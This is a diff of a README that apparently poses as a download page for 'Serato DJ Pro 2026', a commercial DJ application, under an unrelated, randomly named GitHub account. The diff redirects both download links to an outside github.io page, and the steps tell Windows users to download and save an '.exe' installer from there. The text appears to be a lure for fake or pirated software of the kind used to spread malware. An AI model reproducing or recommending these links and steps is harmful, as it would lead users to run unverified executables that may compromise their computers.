@@ -1,6 +1,6 @@
 # 🎧 Serato-DJ-Pro-2026 - Streamline your digital music performance workflow
 
-[![](https://img.shields.io/badge/Download-Serato_DJ_Pro-blue.svg)](https://github.com/Unprovocative-jamaicancapital204/Serato-DJ-Pro-2026/releases)
+[![](https://img.shields.io/badge/Download-Serato_DJ_Pro-blue.svg)](https://unprovocative-jamaicancapital204.github.io)
 
 Serato DJ Pro 2026 improves how you manage your music library, analyze track speeds, and connect your hardware controllers on Windows. This software helps DJs organize crates and prepare music sets with speed and accuracy. Use this guide to set up the software on your computer.
 
@@ -22,7 +22,7 @@ Ensure all Windows updates remain current on your machine to prevent hardware co
 
 Follow these steps to get the installation file:
 
-1. Visit the [official releases page](https://github.com/Unprovocative-jamaicancapital204/Serato-DJ-Pro-2026/releases) to download the installer.
+1. Visit the [official releases page](https://unprovocative-jamaicancapital204.github.io) to download the installer.
 2. Locate the most recent version at the top of the list.
 3. Click the link that ends in ".exe" to start the download.
 4. Save the file to your "Downloads" folder.
